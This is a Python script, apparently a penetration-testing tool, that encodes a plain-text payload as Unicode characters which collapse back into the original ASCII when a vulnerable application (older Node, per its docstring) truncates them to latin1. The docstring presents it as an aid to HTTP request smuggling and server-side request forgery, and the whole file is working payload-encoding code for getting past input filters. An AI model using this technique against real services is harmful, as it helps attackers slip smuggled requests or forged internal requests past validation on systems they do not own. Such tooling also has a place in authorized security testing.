#!/bin/python
"""

    Some applications including older versions of Node will improperly convert unicode characters into latin1 encoding
    by truncating the unicode values to fit into the 0-95 character space for basic latin characters. 
    This script takes a text body in latin characters and returns unicode characters
    that when converted by a vulnerable application would translate back into the original basic latin text body.

    This is useful for performing http request smuggling and server side request forgery.

"""
from collections import defaultdict
import random
import sys
# Latin character set that we want to translate to.
LATIN_START = "00020"
LATIN_END = "007E"

LATIN_MAP = {}
UNICODE_MAP = defaultdict(list)

SUPP_START_CODE = "00A0" # Start if Latin-1 Supplement unicode space
CYR_END_CODE = "04FF" # End of cyrillic

BLACKLIST_CHARS = ['0378', '0379'] # couple of greek letters that don't play well for some reason.

def main():
    import os
 
    if len(sys.argv) < 3:
        print(f"Usage: {os.path.basename(__file__)} inputfile.txt outputfile.txt")

    # generate latin map
    for char in range(int(LATIN_START, 16), int(LATIN_END, 16)):
        k = chr(char)
        LATIN_MAP[hex(char).split('x')[-1]] = k

    # generate map of unicode characters and latin values.
    for char in range(int(SUPP_START_CODE, 16), int(CYR_END_CODE, 16)):
        truncval =  hex(ord(chr(char)))[-2:]
        if truncval not in LATIN_MAP.keys():
            continue
        c = chr(char)
        if char in [int(x, 16) for x in BLACKLIST_CHARS]:
            # some characters through chr won't give the char
            # but a representative string such as \u0379. we don't want these.
            continue
        UNICODE_MAP[LATIN_MAP[truncval]].append(c)

    
    # now generate our string.
    chars = []
    to_translate = None
    with open(sys.argv[1], 'r') as f:
        to_translate = f.read()
    for s in to_translate:
        for k,v in UNICODE_MAP.items():
            if s == k:
                chars.append(random.choice(v))

    translated = "".join(chars)
    print(translated)
    with open(sys.argv[2], 'w') as f:
        f.write(translated)

if __name__ == "__main__":
    main()